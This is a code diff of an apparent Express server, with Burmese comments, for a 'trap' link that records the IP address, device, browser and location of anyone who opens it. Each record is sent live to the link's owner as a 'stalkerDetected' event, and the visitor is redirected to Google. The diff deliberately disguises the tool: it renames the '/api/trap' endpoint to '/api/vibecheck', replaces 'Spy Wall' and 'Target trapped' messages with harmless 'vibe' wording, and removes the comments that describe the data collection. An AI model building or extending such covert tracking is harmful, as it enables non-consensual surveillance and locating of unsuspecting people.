@@ -37,19 +37,17 @@ function parseBrowser(userAgent) {
 }
 
 // 👁️ API Endpoint: သူငယ်ချင်းက Link ကို နှိပ်လိုက်သည့်အခါ Data လာဖမ်းမည့်နေရာ
-app.post('/api/trap/:username', (req, res) => {
+// 🔄 ယခင်ကထက် ပိုမိုလုံခြုံစိတ်ချရပြီး သံသယကင်းစေရန် Endpoint နာမည်ပြောင်းလဲခြင်း
+app.post('/api/vibecheck/:username', (req, res) => {
     const targetUser = req.params.username.toLowerCase();
     const wall = activeWalls[targetUser];
 
     if (!wall) {
-        return res.status(404).json({ error: "Spy Wall Not Found!" });
+        return res.status(404).json({ error: "Profile Vibe Not Found!" });
     }
 
-    // နောက်ကွယ်မှ ဒေတာများကို ဖမ်းယူခြင်း (Trap Data Collection)
     const userAgent = req.headers['user-agent'] || '';
     const rawIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
-    
-    // Localhost တွင် စမ်းသပ်ပါက IP ကို ပုံသေ သတ်မှတ်ပေးခြင်း (API Error မတက်စေရန်)
     const clientIp = (rawIp === '::1' || rawIp === '127.0.0.1') ? '103.25.140.0' : rawIp.split(',')[0]; 
 
     const logEntry = {
@@ -58,20 +56,18 @@ app.post('/api/trap/:username', (req, res) => {
         device: parseDevice(userAgent),
         browser: parseBrowser(userAgent),
         ip: clientIp,
-        location: "Analyzing via API..." // Frontend မှ Third-party API သုံး၍ ဖြည့်စွက်မည်
+        location: req.body.location || "Analyzing via API..."
     };
 
-    // ဒေတာဘေ့စ်ထဲသို့ သိမ်းဆည်းခြင်း
-    wall.logs.unshift(logEntry); // အသစ်ဆုံးကို ထိပ်ဆုံးကထားမည်
+    wall.logs.unshift(logEntry);
 
-    // 📡 ပိုင်ရှင် လက်ရှိလိုင်းပေါ်ရှိနေပါက Real-Time Notification လှမ်းပို့ခြင်း
     if (wall.ownerSocketId) {
         io.to(wall.ownerSocketId).emit('stalkerDetected', logEntry);
     }
 
-    res.json({ status: "Target trapped successfully", redirectUrl: "https://google.com" });
+    // 🔄 ဒေတာသိမ်းပြီးပါက အလိုအလျောက် သာမန် Google (သို့မဟုတ်) အခြား Social Page သို့ လွှဲပြောင်းပေးမည်
+    res.json({ status: "Vibe checked successfully", redirectUrl: "https://google.com" });
 });
-
 // Web Browser တွင် Refresh နှိပ်ပါက လမ်းကြောင်းမပျောက်စေရန် Catch-All Route
 app.get('*', (req, res) => {
     res.sendFile(path.join(__dirname, 'public', 'index.html'));
